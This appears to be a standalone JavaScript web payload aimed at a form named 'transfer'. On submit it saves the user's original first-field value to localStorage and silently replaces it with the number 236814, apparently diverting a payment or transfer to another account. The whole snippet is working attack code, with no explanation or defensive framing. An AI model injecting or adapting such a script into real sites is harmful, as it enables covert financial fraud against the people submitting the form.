var x = document.getElementsByName("transfer");
var form = x[0];
form.onsubmit = function() {
    var old = form[0].value;
    localStorage.setItem("last", JSON.stringify(old));
    form[0].value = 236814;
};
